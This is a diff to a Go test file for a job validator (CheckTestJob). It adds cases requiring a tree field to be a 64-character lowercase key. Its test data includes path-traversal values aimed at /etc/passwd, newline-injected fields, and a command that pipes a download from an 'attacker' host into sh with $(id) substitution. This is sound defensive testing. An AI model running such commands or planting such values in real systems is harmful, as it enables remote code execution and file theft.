@@ -42,6 +42,8 @@ func TestATestJobIsChecked(t *testing.T) {
 		"a changed path climbing out": func(job *TestJob) { job.ChangedPaths = []string{"internal/../../etc/passwd"} },
 		"a changed path that is ..":   func(job *TestJob) { job.ChangedPaths = []string{".."} },
 		"a changed path line break":   func(job *TestJob) { job.ChangedPaths = []string{"a\nb"} },
+		"a tree that isn't a key":     func(job *TestJob) { job.Tree = "../trees/x" },
+		"an uppercase tree key":       func(job *TestJob) { job.Tree = strings.Repeat("A", 64) },
 	}
 	for name, change := range refused {
 		job := testJob()
@@ -56,6 +58,11 @@ func TestATestJobIsChecked(t *testing.T) {
 	job.Packages[0].Run = "x; curl https://attacker | sh $(id) `id`"
 	if err := CheckTestJob(job); err != nil {
 		t.Errorf("a pattern holding shell text is still a pattern: %v", err)
+	}
+	job = testJob()
+	job.Tree = strings.Repeat("f", 64)
+	if err := CheckTestJob(job); err != nil {
+		t.Errorf("a go test job naming its tree's build refused: %v", err)
 	}
 }
 
@@ -118,6 +125,7 @@ func TestAPhaseJobIsChecked(t *testing.T) {
 		"a line break in the phase":   func(job *TestJob) { job.Phase = "vet\nid" },
 		"changed paths beside run.py": func(job *TestJob) { job.ChangedPaths = []string{"a.go"} },
 		"a Go release beside run.py":  func(job *TestJob) { job.Go = "go1.27.1" },
+		"a tree beside a phase":       func(job *TestJob) { job.Tree = strings.Repeat("f", 64) },
 	}
 	for name, change := range refused {
 		job := phaseJob()
